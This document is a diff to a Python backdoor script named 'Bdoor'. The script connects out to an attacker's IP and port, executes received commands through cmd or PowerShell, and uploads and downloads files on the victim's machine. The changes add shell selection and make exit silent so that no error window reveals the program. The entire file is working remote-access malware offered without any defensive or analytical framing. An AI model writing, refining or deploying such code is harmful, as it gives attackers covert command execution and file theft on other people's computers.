@@ -1,18 +1,28 @@
 #!/usr/bin/python
-# General - Using json to manage serialisation to send large data.
-# General - It's able to connect and, receive and send data.
+# General - Using json to manage serialisation to manage the transference of data.
+# General - It's able to connect, receive and send data.
+# The use of sys module make the exit withtout popping up a messages error.
 
-
+import traceback
 import socket
 import json
 import subprocess
 import base64
+import sys
 import os
 
 class Bdoor:
+
+    # The set makes assure the proper cli is chosen.
+    cli_p = {"cmd": "cmd",
+             "PS": "powershell", 
+             "powershell": "powershell", 
+             "default": "dafault"}
+
     def __init__(self, addr, prt):
         self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.conn.connect((addr, prt))
+        self.cli = self.cli_p["default"]
 
     def send_data(self, data):
         json_data = json.dumps(data)
@@ -25,7 +35,7 @@ class Bdoor:
         while True:
             try:  
                 json_data += self.conn.recv(1024).decode()
-                if json_data.decode() == "" or json_data == b'':
+                if json_data == "" or json_data == b'':
                     break
                 # print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
                 # print("\njson_data loads: " + json.loads(json_data) + " - loads type: " + str(type(json.loads(json_data))) + "\n") #testing
@@ -38,6 +48,13 @@ class Bdoor:
 
     def exec_cmd(self, comm):
         # print(comm)
+        # Inserting at the beginning to cli chosen
+        # The parameter /C is to execute the command then exit.
+        if self.cli == "cmd":
+            comm[:0] = [self.cli, "/C"] if self.cli == "cmd" else ""
+        elif self.cli == "powershell":
+            comm[:0] = [self.cli]
+
         output_ = subprocess.run(comm, capture_output=True, shell=True)
         # print("\noutput type: " + str(type(output_)) + " - stdout: " + str(output_.stdout.decode()=="") + "\n") #testing
         # print("\noutput type: " + str(type(output_)) + " - stderr: " + str(output_.stderr.decode()=="") + "\n") #testing
@@ -55,7 +72,7 @@ class Bdoor:
 
     def run(self):
         while True:
-            comm = self.rcve_data(1024)
+            comm = self.rcve_data()
             try:
                 if comm == None:
                     self.exec_cmd("")
@@ -68,17 +85,26 @@ class Bdoor:
                     self.send_data(self.read_f(comm[1]))
                 elif comm[0] == "upload":
                     self.send_data(self.write_f(comm[1], comm[2]))
+                elif comm[0] == "setcli":
+                    self.cli = self.cli_p[comm[1]]
+                    self.send_data("CLI preferred: " + self.cli)
+                elif comm[0] == "getcli":
+                    self.send_data("CLI preferred: " + self.cli)
                 else:
                     self.exec_cmd(comm)
             except (BrokenPipeError, ConnectionAbortedError) as cnerr:
-                print(cnerr.strerror)
+                #print(cnerr.strerror)
                 self.con_close()
-            except (OSError, Exception) as ose:
-                self.send_data('[Bad command]: ' + ose.strerror)
+            except (KeyError, TypeError):
+                self.send_data(f'[Bad command]: {traceback.format_exc()}')
+            except (OSError, Exception):
+                self.send_data('[Bad command]: ' + traceback.format_exc())
+            
     
     def con_close(self):
         self.conn.close()
-        exit()
+        # exiting with sys makes to not to pop a message windows up.
+        sys.exit()
 
 my_bd = Bdoor("<ip>", <prt>)
 my_bd.run()
